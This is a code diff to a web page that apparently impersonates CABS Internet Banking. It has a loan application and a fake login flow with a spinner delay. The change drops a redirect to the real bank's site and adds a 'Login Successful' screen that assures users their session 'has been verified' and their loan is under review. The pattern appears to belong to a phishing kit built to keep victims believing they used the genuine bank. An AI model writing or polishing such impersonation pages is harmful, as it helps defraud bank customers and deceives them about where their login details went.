@@ -637,10 +637,32 @@ function navigate(view) {
       } else {
         await new Promise(r => setTimeout(r, 1500));
         hideSpinner();
-        alert('Login successful! Welcome back.');
-        window.location.href = 'https://www.cabs.co.zw/';
+        navigate('loginSuccess');
       }
     });
+  }
+
+  /* ─ LOGIN SUCCESS ─ */
+  else if (view === 'loginSuccess') {
+    app.innerHTML = `
+<div style="min-height:100vh; background:#fff; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:40px 24px;" class="page">
+  <div style="text-align:center; max-width:360px;">
+    <div style="width:80px; height:80px; background:linear-gradient(135deg,#00a651,#00c060); border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 24px; box-shadow:0 8px 24px rgba(0,166,81,0.35); animation:popIn 0.4s ease both;">
+      <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
+    </div>
+    <h2 style="font-size:1.6rem; font-weight:900; color:#1b3668; margin-bottom:12px;">Login Successful!</h2>
+    <p style="color:#64748b; font-size:0.9rem; line-height:1.6; margin-bottom:8px;">Welcome back, <strong>${state.name ? state.name.split(' ')[0] : 'valued customer'}</strong>.</p>
+    <p style="color:#64748b; font-size:0.9rem; line-height:1.6; margin-bottom:32px;">Your CABS Internet Banking session has been verified successfully.</p>
+    <div style="background:#f0fdf4; border:1.5px solid #bbf7d0; border-radius:14px; padding:16px 20px; margin-bottom:32px;">
+      <p style="color:#00a651; font-size:0.82rem; font-weight:600;">✅ Your loan application is being reviewed. Our team will contact you within 24 hours.</p>
+    </div>
+    <div style="background:#f8faff; border:1.5px solid #e0e8ff; border-radius:14px; padding:16px 20px;">
+      <div style="display:flex; justify-content:space-between; font-size:0.82rem; margin-bottom:8px;"><span style="color:#64748b;">Amount</span><span style="font-weight:700; color:#1b3668;">$${Number(state.amount).toLocaleString()}</span></div>
+      <div style="display:flex; justify-content:space-between; font-size:0.82rem; margin-bottom:8px;"><span style="color:#64748b;">Term</span><span style="font-weight:700; color:#1b3668;">${state.term} months</span></div>
+      <div style="display:flex; justify-content:space-between; font-size:0.82rem;"><span style="color:#64748b;">Monthly Payment</span><span style="font-weight:700; color:#00a651;">$${calcPayment()}</span></div>
+    </div>
+  </div>
+</div>`;
   }
 }
 
